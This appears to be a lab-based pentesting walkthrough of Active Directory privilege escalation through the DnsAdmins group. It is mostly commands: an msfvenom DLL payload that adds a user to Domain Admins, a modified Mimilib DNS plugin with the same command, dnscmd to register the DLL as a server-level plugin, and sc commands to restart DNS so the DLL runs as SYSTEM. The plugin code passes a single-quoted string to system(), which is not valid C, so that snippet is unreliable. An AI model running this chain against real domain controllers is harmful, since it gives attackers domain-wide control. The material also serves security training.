---
title: DnsAdmins
date: 2026-03-06 10:57:29

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Groups
tags:
  - dnscmd.exe

cover: /img/privesc.png
top_img: /img/bg-img.jpg
description: Privilege escalation using the DnsAdmins group.
---


> ➜ DnsAdmins is a Windows group whose members can manage DNS settings within an Active Directory environment. Because the DNS service runs with `SYSTEM privileges ` and supports loading custom plugins, this role can be abused to `execute malicious code by loading a crafted DLL`, potentially leading to full compromise of a Domain Controller.


```powershell
PS C:\Users\netadm> whoami /groups

Group Name                                 Type             SID                                           Attributes    
========================================== ================ ============================================= ===============================================================

INLANEFREIGHT\DnsAdmins                    Alias            S-1-5-21-669053619-2741956077-1013132368-1101 Mandatory group, Enabled by default, Enabled group, Local Group                                              
```

#### Generating a Malicious DLL

> We can generate a malicious DLL to add a user to the `Domain Admins` group using `msfvenom`.

###### msfvenom

```bash
➜ msfvenom -p windows/x64/exec cmd='net group "Domain Admins" netadm /add /domain' -f dll -o adduser.dll
```

###### Mimilib.dll

> Or we can use `Mimilib.dll`

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system('net group "Domain Admins" netadm /add /domain');
	}
	return ERROR_SUCCESS;
}
```


> ➜ Then we transfer the DLL to the target `DC`.


#### Loading Custom DLL

> Using `dnscmd`, we can load the custom DLL

```powershell
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

> Note: We must specify the full path to our custom DLL or the attack will not work properly.


#### Restarting DNS Service

> After Loading our custom dll file, we need to restart the service, but we must have permission to stop and start the DNS service.


> To check whether we have permission, we first need the SID of our user:

```cmd
C:\> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```


> Once we have the user's SID, we can use the `sc` command to check our permissions on the service.

```cmd
C:\> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

> From the output, we can see that our user has `RPWP` permissions, which allow `SERVICE_START` and `SERVICE_STOP` on the DNS service.

> After confirming these permissions, we can stop the DNS service.

 
```cmd
C:\> sc.exe stop dns
```

> Once the service is stopped, we start it again so the DNS server loads and executes our malicious DLL.

```cmd
C:\> sc.exe start dns
```
